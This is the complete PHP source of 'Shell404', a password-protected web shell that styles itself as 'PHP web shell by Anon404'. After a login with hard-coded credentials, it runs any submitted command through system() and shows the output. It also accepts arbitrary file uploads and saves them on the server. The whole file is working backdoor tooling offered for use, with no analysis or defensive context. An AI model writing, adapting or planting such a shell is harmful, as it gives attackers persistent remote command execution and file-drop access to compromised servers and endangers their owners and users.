<?php

	session_start();
	
    $user = "Shell404";
    $pass = "Shell404";
    $username = NULL;
?>

<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
    <title>Shell404</title>

    <style>
        html {
            background-color: black;
            color: lime;
            margin-top : 8% ;
            text-align: center;
        }
        h1 {
            margin: 7px 0 0 2px;
            text-shadow: 0px 0px 10px green;
            text-align: center;
        }
        #des {
            color: red;
            margin: 3px;
            text-shadow: 0px 0px 10px red;
            margin-bottom: 30%;
        }
        #input {
            text-align: center;
            width: 62%;
            height: 33px;
            border: 3px solid lime;
            border-radius: 8px;
            margin-top: 1%;
            box-shadow: 0px 0px 20px green;
            background-color: transparent;
            color: lime;
        }
        #submit {
            width: 40%;
            height: 30px;
            border: 3px solid red;
            border-radius: 8px;
            margin-top: 7%;
            box-shadow: 0px 0px 20px red;
            background-color: transparent;
            color: lime;
            text-shadow: 0px 0px 10px red;
        }
    </style>
</head>
<body>

    <?php
function shellfunc() {
    echo '
    <style>
        html {
            text-align: left;
            margin-top: 2%;
        }
        #input {
            text-align: left;
            width: 50%;
            height: 33px;
            border: 3px solid lime;
            border-radius: 8px;
            margin-top: 1%;
            box-shadow: 0px 0px 20px green;
            background-color: transparent;
            color: lime;
        }
        #des, h1 {
            text-align: center;
        }
        #Run {
            text-align: center;
            width: 20%;
            height: 40px;
            border: 3px solid lime;
            border-radius: 8px;
            margin-top: 1%;
            box-shadow: 0px 0px 20px green;
            background-color: red;
            color: lime;
        }
        #result {
        	border: 3px solid red;
        	border-radius: 8px;
        	box-shadow: 0px 0px 20px red;
        	background-color: transparent;
        	color: lime;
        	padding : 3px;
        }
    </style>

    <h1>Shell404</h1>
    <h4 id="des">Shell404 PHP web shell by Anon404</h4>

    <form method="POST" enctype="multipart/form-data">
        
        <br>
        <style>
            #fileButton, #uploadButton {
                height: 38px;
                border: 3px solid lime;
                border-radius: 8px;
                box-shadow: 0px 0px 20px green;
                background-color: transparent;
                color: lime;
                margin-top: 3px;
            }

            #fileButton:active {
            	background-color: lime;
            	color : black ;
            }

            #uploadButton {
            	background-color: red;
            }
            #uploadButton:active {
            	background-color: black;
            	color : red ;
            }
            
        </style>
        <button id="fileButton" type="button">Select File</button>
        <input type="file" id="fileUploader" name="fileToUpload" style="display: none;">
        <button id="uploadButton" type="submit" name="upload">Upload</button>

        <script>
            document.getElementById("fileButton").onclick = function() {
                document.getElementById("fileUploader").click();
            };

            document.getElementById("fileUploader").onchange = function() {
                alert("File selected: " + this.files[0].name);
            };
        </script>
	<br>
	<input id="input" type="text" name="cmd" placeholder="Command input">
        <input id="Run" type="submit" value="Run">

    </form>
    ';

	
    if (isset($_POST['cmd'])) {
        $cmd = $_POST['cmd'];
        if (!empty($cmd)) {
        	echo '<h4>Output</h4>';
        	echo '<pre>';
        	echo '<div id="result">';
        	system($cmd);
        	echo '</div>';
        	echo '</pre>';
        } else {
        	
        }
    }

    if (isset($_POST['upload'])) {
    	echo '<br>';
        if (isset($_FILES['fileToUpload']) && $_FILES['fileToUpload']['error'] === UPLOAD_ERR_OK) {
            $fileTmpPath = $_FILES['fileToUpload']['tmp_name'];
            $fileName = $_FILES['fileToUpload']['name'];

            if (move_uploaded_file($fileTmpPath, $fileName)) {
                echo "File uploaded successfully: $fileName";
            } else {
                echo "Error uploading file.";
            }
        } else {
            echo "No file uploaded or there was an error.";
        }
    }
}




if (isset($_POST['username']) && isset($_POST['password'])) {
    $username = $_POST['username'];
    $password = $_POST['password'];

    if ($user === $username && $pass === $password) {
        $_SESSION['logged_in'] = true;
    } else {
        $error = "Incorrect username or password";
    }
}

if (isset($_SESSION['logged_in']) && $_SESSION['logged_in'] === true) {
    shellfunc();
} else {
    showLoginForm(isset($error) ? $error : '');
}

function showLoginForm($error = '') {
    echo '
    <h1>Shell404</h1>
    <h4 id="des">Shell404 PHP web shell by Anon404</h4>

    <form method="POST">
        <input required id="input" type="text" name="username" placeholder="Enter Username">
        <br>
        <input required id="input" type="password" name="password" placeholder="Enter Password">
        <br>
        <input id="submit" type="submit" value="Login">
    </form>
    ';

    if ($error) {
        echo '<h3 style="color: red; text-shadow: 0px 0px 10px red;">' . $error . '</h3>';
    }
}
    ?>

</body>
</html>
